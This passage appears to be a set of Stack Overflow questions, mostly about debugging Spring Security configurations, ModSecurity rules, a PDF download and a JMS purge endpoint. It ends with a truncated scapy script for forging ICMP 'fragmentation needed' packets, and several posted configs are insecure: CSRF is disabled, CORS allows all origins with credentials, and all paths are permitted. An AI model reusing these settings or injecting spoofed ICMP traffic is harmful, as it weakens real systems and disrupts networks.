<li>Languages: Java 17, Kotlin (Jetbrains Kotlin and Kotlin test library versions) 1.8.10</li>
</ul>
<p>Below are modified code snippets for Jetty based Http Server Configuration, API Configuration and API Security Configuration which now uses a SecurityFilterChain instead of WebSecurityConfigurerAdapter.</p>
<p><strong>Http Server Configuration</strong></p>
<pre><code>@Configuration
@EnableConfigurationProperties(ApiServiceProperties::class)
@ComponentScan(&quot;com......service&quot;)
@Import(value = [ApiSecurityConfig::class, WebFluxConfig::class])
class HttpServerConfig(var apiServiceProperties: ApiServiceProperties) {

    /**
     * Jetty Server Bean.
     */
    @Bean
    @SuppressWarnings(&quot;LongMethod&quot;)
    fun jettyServer(
        context: ApplicationContext,
        springSecurityFilterChain: Filter,
        mdcSetterFilter: MdcSetterFilter,
        webContextFilter: WebContextFilter
    ): Server {
        LOG.info(
            &quot;Starting Jetty server with &quot; + &quot;&lt;some custom properties are being printed here&gt;&quot;
        )

        .. code removed ..

        ServletContextHandler(server, &quot;&quot;).apply {
            val servlet = JettyHttpHandlerAdapter(WebHttpHandlerBuilder.applicationContext(context).build())
            addServlet(ServletHolder(servlet), &quot;/&quot;)

            addFilter(FilterHolder(mdcSetterFilter), &quot;/*&quot;, EnumSet.of(DispatcherType.REQUEST))
            addFilter(FilterHolder(webContextFilter), &quot;/*&quot;, EnumSet.of(DispatcherType.REQUEST))

            // The ping endpoint should be unsecured, therefore ignored by the security filter
            addFilter(
                FilterHolder { request: ServletRequest, response: ServletResponse, chain: FilterChain -&gt;
                    if (request is HttpServletRequest &amp;&amp; request.requestURI != &quot;/v1/ping&quot;) {
                        springSecurityFilterChain.doFilter(request, response, chain)
                    } else {
                        chain.doFilter(request, response)
                    }
                },
                &quot;/v1/*&quot;,
                EnumSet.of(DispatcherType.REQUEST)
            )
        }.start()

        .. code removed ..

        server.start()

        LOG.info(&quot;Started Jetty server.&quot;)
        return server
    }

    .. code removed ..
}
</code></pre>
<p><strong>API Configuration</strong></p>
<pre><code>@Configuration
@ComponentScan(basePackages = [
    &quot;com......security&quot;,
    &quot;com......service&quot;
])
@EnableConfigurationProperties(ApiServiceProperties::class)
@Import(HttpServerConfig::class)
class ApiServiceConfig : AbstractSpringBasedApplicationConfig()
</code></pre>
<p><strong>API Security Configuration</strong></p>
<pre><code>@Configuration
@EnableWebSecurity
@ComponentScan(&quot;com......security&quot;, &quot;com......service&quot;)
@EnableMethodSecurity(prePostEnabled = false, jsr250Enabled = true)
class ApiSecurityConfig(
    private val restAuthenticationEntryPoint: RestAuthenticationEntryPoint,
    private val restAuthenticationProvider: RestAuthenticationProvider
) {
    @Bean
    fun securityFilterChain(http: HttpSecurity): SecurityFilterChain {
        http
            .cors { }
            .anonymous { it.disable() }
            .httpBasic { it.disable() }
            .formLogin { it.disable() }
            .logout { it.disable() }
            .csrf { it.disable() }
            .sessionManagement { it.sessionCreationPolicy(SessionCreationPolicy.STATELESS) }
            .exceptionHandling { it.authenticationEntryPoint(restAuthenticationEntryPoint) }
            .authenticationManager { authentication -&gt; restAuthenticationProvider.authenticate(authentication) }
            .addFilterBefore(RestAuthenticationTokenFilter(), AnonymousAuthenticationFilter::class.java)
            .authorizeHttpRequests { it.requestMatchers(&quot;/**&quot;).permitAll().anyRequest().authenticated() }
        return http.build()
    }

    @Bean
    fun corsConfigurationSource(): CorsConfigurationSource = UrlBasedCorsConfigurationSource().apply {
        registerCorsConfiguration(
            &quot;/**&quot;,
            CorsConfiguration().applyPermitDefaultValues().apply {
                allowedMethods = listOf(&quot;POST&quot;, &quot;GET&quot;, &quot;PUT&quot;, &quot;DELETE&quot;, &quot;HEAD&quot;)
            }
        )
    }
}
</code></pre>
<p><strong>Custom authentication provider</strong></p>
<pre><code>@Component
class RestAuthenticationProvider(
    private val securityServiceClient: SecurityServiceClient,
    private val cryptoService: CryptoService
) : AuthenticationProvider {

    /**
     * Given a [token] and [verifiedTokenModel], return a new User with granted authorities.
     */
    private fun createAuthenticatedUser(token: String, verifiedTokenModel: VerifiedTokenModel) = User
        .withUsername(verifiedTokenModel.verifiedPrincipalModel.id)
        .password(token)
        .authorities(verifiedTokenModel.verifiedPrincipalModel.scopes.map { scope -&gt; 
            SimpleGrantedAuthority(&quot;ROLE_${scope.toUpperCase()}&quot;)
        })
        .build()

    /**
     * Given a [verifiedTokenModel], create a JSON Web Token to represent the authorizations of the verified principal.
     */
    private fun createJwt(verifiedTokenModel: VerifiedTokenModel) = cryptoService.createAuthToken(
        .. code removed ..
    )

    override fun authenticate(authentication: Authentication): Authentication? =
        (authentication as? RestAuthenticationToken)?.token?.let { token -&gt;
            try {
                val verifiedTokenModel = securityServiceClient.verifyToken(token)
                val user = createAuthenticatedUser(token = token, verifiedTokenModel = verifiedTokenModel)
    
                RestAuthenticationToken(
                    .. code removed ..
                    jwt = createJwt(verifiedTokenModel = verifiedTokenModel)
                )
            } catch (e: ReplyException) {
                .. code removed ..
            }
        }


    .. code removed ..
}
</code></pre>
<p><strong>Below is a comparison of the new and old code</strong> for security configuration (Spring Boot 2.6.2 and Spring Core 5.3.14)</p>
<p><a href=""https://i.stack.imgur.com/M5JEh.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/M5JEh.png"" alt=""enter image description here"" /></a></p>
<p><strong>Postman request always receives a 403 response</strong></p>
<p><a href=""https://i.stack.imgur.com/aZKNF.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/aZKNF.png"" alt=""enter image description here"" /></a></p>
<p><strong>Logs</strong></p>
<pre><code>DEBUG c.a.e.d.api.v1.security.MdcSetterFilter : Setting MDC logging context.
DEBUG c.a.e.d.a.v1.security.WebContextFilter  : Setting WebContext on message
DEBUG o.s.security.web.FilterChainProxy       : Securing GET /v1/clients/*/brands  
INFO  c.a.e.d.api.v1.config.HttpServerConfig  : Token :: &lt;bearer token value is printed here&gt;
...
...
DEBUG o.s.w.s.adapter.HttpWebHandlerAdapter   : [49377233] HTTP GET &quot;/v1/clients/*/brands&quot;
...
DEBUG s.w.r.r.m.a.RequestMappingHandlerMapping: [49377233] Mapped to com......service.ClientsApiController#listBrands(String, ServerHttpRequest)
DEBUG AuthorizationManagerBeforeMethodInterceptor: Authorizing method invocation ReflectiveMethodInvocation: public org.springframework.http.ResponseEntity com......service.ClientsApiController.listBrands(..); target is of class [com......service.ClientsApiController]

DEBUG AuthorizationManagerBeforeMethodInterceptor: Failed to authorize ReflectiveMethodInvocation: public org.springframework.http.ResponseEntity com......service.ClientsApiController.listBrands(...); target is of class [com......service.ClientsApiController] with authorization manager org.springframework.security.config.annotation.method.configuration.DeferringObservationAuthorizationManager@2323fe6a and decision AuthorityAuthorizationDecision [granted=false, authorities=[ROLE_READ_BRANDS]]
DEBUG s.w.r.r.m.a.RequestMappingHandlerAdapter: [49377233] Using @ExceptionHandler com......service.DefaultExceptionHandler#onThrowable(Throwable, ServerWebExchange)  
DEBUG o.s.w.s.adapter.HttpWebHandlerAdapter   : [49377233] Completed 403 FORBIDDEN 
</code></pre>
<ul>
<li>Have tried multiple combinations of the security chain as suggested on several similar threads</li>
<li>Added a few more log statements in security configuration code to capture these events and help  understand how the new flow works</li>
<li>DEBUG level log statements added inside the RestAuthenticationProvider.authenticate() are not showing up in the logs, indicating it is not getting invoked, and the flow is breaking before reaching that point.</li>
</ul>
<p>However I suspect that the configured AuthenticationProvider (tried using http.authenticationProvider(..) earlier, but that did not work either) and AuthenticationManager are not getting plugged in the chain for some reason. Need help from the community in guiding me to set this up correctly. Thank you.</p>
"
"<p>So I have spring security configured to my springboot 3 application. Also The application uses JWT token to authenticate the end points. Everything is working fine on local machine. But once I create a docker image and run the application end points are working fine swagger UI is not accessible any more. This is my security configuration:</p>
<p><strong>application.properies</strong></p>
<pre><code>server.servlet.context-path=/
</code></pre>
<p><strong>SecurityConfiguration</strong></p>
<pre class=""lang-java prettyprint-override""><code>@Configuration
//@EnableWebSecurity
@RequiredArgsConstructor
public class SecurityConfiguration {

    private final JwtAuthenticationFilter jwtAuthFilter;
    private final AuthenticationProvider authenticationProvider;


    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {

        http.cors((cors) -&gt; cors.disable()).csrf((csrf) -&gt; csrf.disable())
//                .authorizeHttpRequests((authz)-&gt;authz.requestMatchers(&quot;swagger-ui.html&quot;).permitAll()
                .authorizeHttpRequests((authz) -&gt; authz
                        .requestMatchers(HttpMethod.GET, &quot;api/v1/auth/**&quot;, &quot;/swagger-ui.html&quot;, &quot;/swagger-ui/**&quot;, &quot;/v3/api-docs/**&quot;)
                        .permitAll()
                        .requestMatchers(HttpMethod.POST, &quot;api/v1/auth/**&quot;, &quot;/swagger-ui.html&quot;, &quot;/swagger-ui/**&quot;, &quot;/v3/api-docs/**&quot;)
                        .permitAll()
                        .anyRequest().authenticated()).csrf(AbstractHttpConfigurer::disable).cors(cors -&gt; cors.configurationSource(corsConfigurationSource()))
                .sessionManagement((session) -&gt; session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
                .authenticationProvider(authenticationProvider)
                .addFilterAfter(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class);
        return http.build();
    }

    /* @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception{

        http.authorizeHttpRequests(authz-&gt;authz.anyRequest().permitAll());
        return http.build();
    }*/

    @Bean
    CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();
        configuration.setAllowCredentials(true);
        configuration.setAllowedOrigins(Arrays.asList(&quot;*&quot;));
        configuration.setAllowedMethods(Arrays.asList(&quot;*&quot;));
        configuration.setAllowedHeaders(Arrays.asList(&quot;*&quot;));
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration(&quot;/**&quot;, configuration);
        return source;
    }

}
</code></pre>
"
"<pre class=""lang-java prettyprint-override""><code>@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        .csrf(AbstractHttpConfigurer::disable)
        .authorizeHttpRequests(req -&gt;
            req
                .requestMatchers(&quot;/api/v1/auth/**&quot;).permitAll()
                .anyRequest().authenticated()
        )

        .sessionManagement(session -&gt; session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
        .authenticationProvider(authenticationProvider)
        .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class)
        .logout(logout -&gt;
            logout.logoutUrl(&quot;/api/v1/auth/logout&quot;)
                .addLogoutHandler(logoutHandler)
                .logoutSuccessHandler(
                    (request, response, authentication) -&gt; SecurityContextHolder.clearContext())
        );

    return http.build();
}
</code></pre>
<p>I need some help
For each MvcRequestMatcher, call MvcRequestMatcher#setServletPath to indicate the servlet path.</p>
"
"<p>My springboot application (for blog) is using JWT method of authentication. When user tries to find a blog by the <code>pageId</code> which doesn't exist in the repository, I am trying to throw a <code>NoSuchElementException</code></p>
<p>In BlogService:</p>
<pre><code>    public BlogResponseDTO findBlogByPageId(String pageId) {
        BlogEntity blogEntity = blogRepository.findByPageId(pageId);
        if (blogEntity == null) {
            throw new NoSuchElementException(&quot;Blog not found for pageId: &quot; + pageId);
        }
        return buildBlogResponseDTO(blogEntity);
    }
</code></pre>
<p>But it throws <code>401 Unauthorized</code> error as a response.</p>
<p><strong>WebSecurityConfig</strong>:</p>
<pre><code>
//Imports
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.web.servlet.FilterRegistrationBean;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.annotation.Order;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.config.annotation.authentication.configuration.AuthenticationConfiguration;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configurers.AbstractHttpConfigurer;
import org.springframework.security.config.http.SessionCreationPolicy;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.security.web.authentication.Http403ForbiddenEntryPoint;
import org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;
import org.springframework.web.multipart.support.MultipartFilter;

import static org.springframework.security.config.Customizer.withDefaults;

@Configuration
@EnableWebSecurity
public class WebSecurityConfig {
    @Autowired
    private CustomUserDetailsService userDetailsService;

    @Autowired
    private JwtRequestFilter jwtRequestFilter;

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
                .authorizeHttpRequests((auth) -&gt; auth
                        .requestMatchers(&quot;/auth&quot;).permitAll()
                        .anyRequest().authenticated()
                )
                .csrf(AbstractHttpConfigurer::disable)
                .httpBasic(withDefaults())
                .userDetailsService(userDetailsService)
                .sessionManagement(sess -&gt; sess.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
                .exceptionHandling(httpSecurityExceptionHandlingConfigurer -&gt; {
                    httpSecurityExceptionHandlingConfigurer.authenticationEntryPoint((request, response, authException) -&gt; {
                        response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
                        response.getWriter().write(&quot;Authentication failed: &quot; + authException.getMessage());
                    });
                });
        http.addFilterBefore(jwtRequestFilter, UsernamePasswordAuthenticationFilter.class);
        return http.build();
    }
    

    @Bean
    public AuthenticationManager authenticationManager(AuthenticationConfiguration authenticationConfiguration) throws Exception {
        return authenticationConfiguration.getAuthenticationManager();
    }
}

</code></pre>
<p>My application doesn't throw runtime errors from even though I try throwing it explicitly. Can someone help me with what am I missing? If you need any more details, please drop a comment.</p>
"
"<p>How to stop replacing CSRF Token for ignoringRequestMatchers? I did not implement the codes below and I am trying to solve someone else problem arised from the implementation</p>
<pre><code>    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {

        CsrfTokenRequestAttributeHandler requestHandler = new CsrfTokenRequestAttributeHandler();
        // set the name of the attribute the CsrfToken will be populated on
        requestHandler.setCsrfRequestAttributeName(&quot;_csrf&quot;);
        // add additional same site strict and secure to CookieCsrfTokenRepository
        CookieCsrfTokenRepository csrfTokenRepo = new CookieCsrfTokenRepository();
        csrfTokenRepo.setCookieCustomizer(cookieBuilder -&gt; cookieBuilder
                .sameSite(Cookie.SameSite.STRICT.attributeValue())
                .secure(true)
                );
        
        return http.csrf((csrf) -&gt; csrf
                    .csrfTokenRepository(csrfTokenRepo) // CSRF configure for cookie
                    .csrfTokenRequestHandler(requestHandler) // CSRF configure for request handler
                    .ignoringRequestMatchers(&quot;/user/getUserDetails&quot;, &quot;/user/register&quot;, &quot;/user/refreshToken&quot;) // Ignore CSRF for certain urls
                    //  https://docs.spring.io/spring-security/reference/servlet/exploits/csrf.html#disable-csrf  &lt;== Refer to this
                )
                .cors(Customizer.withDefaults()) // CORS configurations
                .authorizeHttpRequests(request -&gt; request
                    .requestMatchers(&quot;/user/register&quot;,&quot;/user/login&quot;,&quot;/user/refreshToken&quot;,&quot;/home&quot;).permitAll()
                    // .requestMatchers(&quot;/**&quot;).permitAll() uncomment this for static file host
                    .anyRequest().authenticated()
                ) // HTTP Request configurations
                .sessionManagement(session -&gt; session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
                .addFilterBefore(jwtFilter, UsernamePasswordAuthenticationFilter.class)
                .addFilterAfter(csrfCookieFilter, UsernamePasswordAuthenticationFilter.class)
                .build();
    }
</code></pre>
"
"<p>After migrating from SpringBoot 2.5 to 3.2 a generated PDF (using itext7-core:7.2.2) becomes invalid after downloading it.</p>
<p>There are no issues viewing it in browser but when I download the pdf its coming without any extension and even if I download the file and give the extension manually the content is the web page and not the PDF. I saw this by opening the downloaded file using Notepad (contains <strong>source code of the web page</strong>.. not even the page from where I am generating the pdf.)</p>
<p>The main changes I made for the migration(SB2.5&gt;sb3.2) in the class where pdf creation code exists is replacing javax to jakarta, mainly <code>javax.servlet.http.HttpServletResponse</code> to <code>jakarta.servlet.http.HttpServletResponse</code></p>
<p>I don't think there is any issue with the pdf generation code(how i am using itext library) because it is working in SB2.5.</p>
<p>Roughly below is my pdf generation code,</p>
<pre><code>public void pdfgeneration(HttpServletRequest request, HttpServletResponse response)
           throws IOException, ServletException {
try {
           ByteArrayOutputStream ba = new ByteArrayOutputStream();
           PdfWriter writer = new PdfWriter(ba);
           PdfDocument pdfDocument = new PdfDocument(writer);
           Document document = new Document(pdfDocument, PageSize.A4, false);

           PdfDocumentInfo pdfMetaData = pdfDocument.getDocumentInfo();
           pdfMetaData.setTitle(Constants.TITLE);
           pdfMetaData.setAuthor(Constants.AUTHOR);
           pdfMetaData.setSubject(Constants.SUBJECT);
           pdfMetaData.setProducer(&quot;&quot;);
      .
      .
      .
       document.close();
       response.setHeader(&quot;Expires&quot;,&quot;0&quot;);
       response.setHeader(&quot;Cache-Control&quot;, &quot;must-revalidate,post-check=0,pre-check=0&quot;);
       response.setHeader(&quot;Pragma&quot;, &quot;public&quot;);
       response.setContentType(&quot;application/pdf&quot;);
       response.setContentLength(ba.size());
       OutputStream outy = response.getOutputStream();
       ba.writeTo(outy);
       outy.flush();
       outy.close();
}catch(){
....
}

</code></pre>
<p>If anyone has worked on this/ faced this issue and remediated please let me know.</p>
"
"<p>Used <a href=""https://systemweakness.com/nginx-ingress-waf-with-modsecurity-from-zero-to-hero-fa284cb6f54a"" rel=""nofollow noreferrer"">this</a> article to set up ModSecurity. But getting an error from nginx-controller when using XML &amp; JSON SecRules.</p>
<p>When setting both <code>enable-owasp-modsecurity-crs: true</code> and <code>enable-modsecurity: true</code>, the former overrides the recommended set of ModSecurity settings. This can be surprising as it means you won’t have request body inspection enabled nor parsing of XML/JSON requests, which is why I explicitly added those two SecRules. When adding these two lines to my ingress,</p>
<pre><code># Enable XML and JSON parsing
    SecRule REQUEST_HEADERS:Content-Type &quot;(?:application(?:/soap\\+|/)|text/)xml&quot; &quot;id:'200000',phase:1,t:none,t:lowercase,pass,nolog,ctl:requestBodyProcessor=XML&quot;
    SecRule REQUEST_HEADERS:Content-Type &quot;application/json&quot; &quot;id:'200001',phase:1,t:none,t:lowercase,pass,nolog,ctl:requestBodyProcessor=JSON&quot;
</code></pre>
<p>The nginx-controller pods getting an error:</p>
<pre><code>one or more objects failed to apply, reason: 
admission webhook &quot;validate.nginx.ingress.kubernetes.io&quot; denied the request: 
------------------------------------------------------------------------------- 
Error: exit status 1 2024/03/04 17:45:48 [emerg] 3741
#3741: unexpected &quot;2&quot; in /tmp/nginx/nginx-cfg4276377893:
132 nginx: [emerg] unexpected &quot;2&quot; in /tmp/nginx/nginx-cfg4276377893:
132 nginx: configuration file /tmp/nginx/nginx-cfg4276377893 test failed 
-------------------------------------------------------------------------------
</code></pre>
<pre><code>I0304 17:43:00.098748       7 controller.go:190] &quot;Configuration changes detected, backend reload required&quot;
E0304 17:43:00.165306       7 controller.go:205] Unexpected failure reloading the backend:

-------------------------------------------------------------------------------
Error: exit status 1
2024/03/04 17:43:00 [emerg] 3651#3651: unexpected &quot;2&quot; in /tmp/nginx/nginx-cfg2331967383:132
nginx: [emerg] unexpected &quot;2&quot; in /tmp/nginx/nginx-cfg2331967383:132
nginx: configuration file /tmp/nginx/nginx-cfg2331967383 test failed

-------------------------------------------------------------------------------
E0304 17:43:00.165351       7 queue.go:131] &quot;requeuing&quot; err=&lt;
    
    -------------------------------------------------------------------------------
    Error: exit status 1
    2024/03/04 17:43:00 [emerg] 3651#3651: unexpected &quot;2&quot; in /tmp/nginx/nginx-cfg2331967383:132
    nginx: [emerg] unexpected &quot;2&quot; in /tmp/nginx/nginx-cfg2331967383:132
    nginx: configuration file /tmp/nginx/nginx-cfg2331967383 test failed
    
    -------------------------------------------------------------------------------
 &gt; key=&quot;prod-witc-infra/oauth2-proxy-native-redis-replicas-zdl5l&quot;
I0304 17:43:00.165387       7 event.go:298] Event(v1.ObjectReference{Kind:&quot;Pod&quot;, Namespace:&quot;kube-system&quot;, Name:&quot;rke2-ingress-nginx-controller-qjmwr&quot;, UID:&quot;758bc746-af41-4099-9248-d5bdb627d623&quot;, APIVersion:&quot;v1&quot;, ResourceVersion:&quot;203713628&quot;, FieldPath:&quot;&quot;}): type: 'Warning' reason: 'RELOAD' Error reloading NGINX: 
-------------------------------------------------------------------------------
Error: exit status 1
2024/03/04 17:43:00 [emerg] 3651#3651: unexpected &quot;2&quot; in /tmp/nginx/nginx-cfg2331967383:132
nginx: [emerg] unexpected &quot;2&quot; in /tmp/nginx/nginx-cfg2331967383:132
nginx: configuration file /tmp/nginx/nginx-cfg2331967383 test failed

-------------------------------------------------------------------------------
</code></pre>
<p>Full ingress manifest:</p>
<pre class=""lang-yaml prettyprint-override""><code>apiVersion: v1
data:
  #https://systemweakness.com/nginx-ingress-waf-with-modsecurity-from-zero-to-hero-fa284cb6f54a
  allow-snippet-annotations: &quot;false&quot;
  # Enables ModSecurity functionality
  enable-modsecurity: &quot;true&quot;
  # Enables loading the core rule set (optional, can be enabled on specific ingresses only instead)
  enable-owasp-modsecurity-crs: &quot;true&quot;
  # Update ModSecurity config and rules
  modsecurity-snippet: |
    # Enable prevention mode. Can be any of: DetectionOnly,On,Off
    # (default is DetectionOnly)
    SecRuleEngine On      
    
    # Enable scanning of the request body
    SecRequestBodyAccess On

    # Enable XML and JSON parsing
    SecRule REQUEST_HEADERS:Content-Type &quot;(?:application(?:/soap\\+|/)|text/)xml&quot; &quot;id:'200000',phase:1,t:none,t:lowercase,pass,nolog,ctl:requestBodyProcessor=XML&quot;
    SecRule REQUEST_HEADERS:Content-Type &quot;application/json&quot; &quot;id:'200001',phase:1,t:none,t:lowercase,pass,nolog,ctl:requestBodyProcessor=JSON&quot;
    
    # Max request sizes in bytes (with/without files)
    # Note NGINX Ingress has its own annotations, keep in sync!
    SecRequestBodyLimit 20971520 # 20Mb (default is 12.5Mb)
    SecRequestBodyNoFilesLimit 262144 # 250Kb (default is 128Kb)
    SecRequestBodyLimitAction Reject # Reject if larger (we could also let it pass with ProcessPartial)

    # Update config to include PUT/PATCH/DELETE in the allowed HTTP methods (instead of fully disabling 911100)
    SecAction &quot;id:900200,phase:1,nolog,pass,t:none,setvar:tx.allowed_methods=GET HEAD POST OPTIONS PUT PATCH DELETE&quot;

    # Send ModSecurity audit logs to the stdout (only for rejected requests)
    SecAuditLog /dev/stdout
    SecAuditLogFormat JSON
    SecAuditEngine RelevantOnly # could be On/Off/RelevantOnly

kind: ConfigMap
metadata:
  annotations:
    meta.helm.sh/release-name: rke2-ingress-nginx
    meta.helm.sh/release-namespace: kube-system
  labels:
    app.kubernetes.io/component: controller
    app.kubernetes.io/instance: rke2-ingress-nginx
    app.kubernetes.io/managed-by: Helm
    app.kubernetes.io/name: rke2-ingress-nginx
    app.kubernetes.io/part-of: rke2-ingress-nginx
  name: rke2-ingress-nginx-controller
  namespace: kube-system
</code></pre>
<p>Upon investigating the nginx config files:</p>
<pre class=""lang-bash prettyprint-override""><code>www-data@rke2-ingress-nginx-controller-qjmwr:/etc/nginx&gt; nginx -c /tmp/nginx/nginx-cfg4276377893
2024/03/04 19:05:48 [emerg] 4242#4242: unexpected &quot;2&quot; in /tmp/nginx/nginx-cfg4276377893:132
nginx: [emerg] unexpected &quot;2&quot; in /tmp/nginx/nginx-cfg4276377893:132

kubectl cp kube-system/rke2-ingress-nginx-controller-qjmwr:/tmp/nginx/nginx-cfg4276377893 nginx-cfg4276377893
</code></pre>
<p>The 132 &amp; 133 lines of the nginx config are:</p>
<pre><code>SecRule REQUEST_HEADERS:Content-Type &quot;(?:application(?:/soap\\+|/)|text/)xml&quot; &quot;id:'200000',phase:1,t:none,t:lowercase,pass,nolog,ctl:requestBodyProcessor=XML&quot;
        SecRule REQUEST_HEADERS:Content-Type &quot;application/json&quot; &quot;id:'200001',phase:1,t:none,t:lowercase,pass,nolog,ctl:requestBodyProcessor=JSON&quot;
</code></pre>
<p>When I remove those two lines, it's all good. What seems to be a problem with XML and JSON parsing?</p>
<p>Current workaround:
Remove the XML and JSON parsing.</p>
"
"<p>I would like to know if ModSecurity is able to perform censorhip.</p>
<p>For example, the response of the application is:</p>
<p>{&quot;error&quot;: null,
&quot;id&quot;: &quot;1&quot;,
&quot;result&quot;: [ { &quot;name&quot;: &quot;fly&quot;, &quot;class&quot;: &quot;insect&quot; }, { &quot;name&quot;: &quot;spider&quot;, &quot;class&quot;: &quot;arachnid&quot;} ]
}</p>
<p>And we would like send the following response, without the &quot;spider&quot; part, to the client:</p>
<p>{&quot;error&quot;: null,
&quot;id&quot;: &quot;1&quot;,
&quot;result&quot;: [ { &quot;name&quot;: &quot;fly&quot;, &quot;class&quot;: &quot;insect&quot; } ]
}</p>
<p>We need this because the editor of the application is not able to perform such response with some filter in the request for example.</p>
<p>I cannot find any information to know if it is possible, and if so how it can be done.</p>
<p>So I've tried with a rule like ...</p>
<hr />
<pre><code>SecRule RESPONSE_BODY &quot;@rx .*&quot; &quot;id:100,phase:4,exec:/usr/local/bin/change-response-body.lua,allow&quot;
</code></pre>
<hr />
<p>... and a change-response-body.lua script like:</p>
<hr />
<pre><code>#!/usr/bin/lua
function main()

local respBody = m.getvar(&quot;RESPONSE_BODY&quot;)

-- some parsing on respBody

respBody = &quot;just a try&quot;

m.setenv(&quot;RESPONSE_BODY&quot;, respBody)
m.setvar(&quot;RESPONSE_BODY&quot;, respBody )

return 1
end
</code></pre>
<hr />
<p>And it does not work.</p>
<p>Can you tell help me on that please ?</p>
<p>Thanks in advance.</p>
<p>Spin</p>
"
"<p>I've installed Mod_Security on my IIS 10, i followed directions and ok.
Rename REquest-900*.conf.example to .conf, create rules etc.
If i enable ModSecurity by &quot;SecRuleEngine On&quot; on even if i set it in DetectionMode, all interecation from php pages stop working, for example wordpress login on php form, anything, i can surf but can't have an interaction.</p>
<p>In debug.log i have these errors <code>[06/Mar/2024:07:10:02.227184 +0100] [SERVER/sid#214b7a32ab0][rid#214b7a34ac0][//xmlrpc.php][2] Warning. Match of &quot;eq 0&quot; against &quot;REQBODY_ERROR&quot; required. [file &quot;C:\Program Files\ModSecurity IIS\modsecurity.conf&quot;] [line &quot;64&quot;] [id &quot;200002&quot;] [msg &quot;Failed to parse request body.&quot;] [data &quot;XML parser error: XML: Failed parsing document.&quot;] [severity &quot;CRITICAL&quot;] </code>
and in line 64 of modsecurity.conf i have this</p>
<pre><code>id:'200002', phase:2,t:none,log,deny,status:400,msg:'Failed to parse request body.',logdata:'%{reqbody_error_msg}',severity:2
</code></pre>
<p>In modsec_audit.log</p>
<pre><code>--df680000-F--
HTTP/1.1 500 Internal Server Error
Connection: close
Date: Wed, 06 Mar 2024 06:10:03 +0000
Content-Type: text/xml; charset=UTF-8
Server: Microsoft-IIS/10.0
X-Robots-Tag: noindex, follow

--df680000-E--
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;methodResponse&gt;
  &lt;fault&gt;
    &lt;value&gt;
      &lt;struct&gt;
        &lt;member&gt;
          &lt;name&gt;faultCode&lt;/name&gt;
          &lt;value&gt;&lt;int&gt;-32700&lt;/int&gt;&lt;/value&gt;
        &lt;/member&gt;
        &lt;member&gt;
          &lt;name&gt;faultString&lt;/name&gt;
          &lt;value&gt;&lt;string&gt;parse error. not well formed&lt;/string&gt;&lt;/value&gt;
        &lt;/member&gt;
      &lt;/struct&gt;
    &lt;/value&gt;
  &lt;/fault&gt;
&lt;/methodResponse&gt;

--df680000-H--
Message: XML parser error: XML: Failed parsing document.
Message: Warning. Match of &quot;eq 0&quot; against &quot;REQBODY_ERROR&quot; required. [file &quot;C:\Program Files\ModSecurity IIS\modsecurity.conf&quot;] [line &quot;64&quot;] [id &quot;200002&quot;] [msg &quot;Failed to parse request body.&quot;] [data &quot;XML parser error: XML: Failed parsing document.&quot;] [severity &quot;CRITICAL&quot;]
Apache-Handler: IIS
Stopwatch: 1709705402227184 1218771 (- - -)
Stopwatch2: 1709705402227184 1218771; combined=0, p1=0, p2=0, p3=0, p4=0, p5=0, sr=0, sw=0, l=0, gc=0
Response-Body-Transformed: Dechunked
Producer: ModSecurity for IIS (STABLE)/2.9.7 (http://www.modsecurity.org/).
Server: ModSecurity Standalone
Engine-Mode: &quot;DETECTION_ONLY&quot;
--df680000-Z--
</code></pre>
<p>I really don't know how to fix it, at this time i have to Turn Off ModSecurity</p>
"
"<pre><code>@RequestMapping(&quot;/process/{userInput}&quot;) 
public Integer purgeMessage(@PathVariable string queueName) {
   if(StringUtils.isNotEmpty(queueName) &amp;&amp; queueName.length &lt;=10)
        Integer count = service.publishMessage(queueName);
    else
        throw new RuntimeException(&quot;not valid&quot;);
}

public Integer publishMessage(String queueName) {
    Integer preCount = 0;

    // return number of count in a queue
    preCount = jmsTemplate.browse(queueName);// not full code written
    Integer count = null != preCount ? preCount : 0;

    while (count &gt; 0) {
        jmsTemplate.receive(queueName);
        count--;
    }

    Integer postCount = jmsTemplate.browse(queueName);// not full code written

    return postCount;
}
</code></pre>
<p>I tried validating input string and set maximum limit in while also but still I am facing this issue</p>
"
"<p>I want to do the following: I have a client and a server communicating. Both are in different subnets connected by a router. I want to be able to reduce the path MTU between the two by injecting an ICMP type 3, code 4 message with scapy. I know that in this packet I have to include the IP header and the  first 8-Bytes of the packet that caused the ICMP error.
I am sending a ping with 1300 Bytes. I want to reduce the path MTU to 1000 so that the ping would fragment in two packets starting at 1000 Bytes.</p>
<p>My implementation forging the ICMP error:</p>
<pre><code>from scapy.all import *

def callback(pkt):
    ip_orig = pkt[IP]
    ip_orig.flags = 2
    icmp_orig = pkt[ICMP]
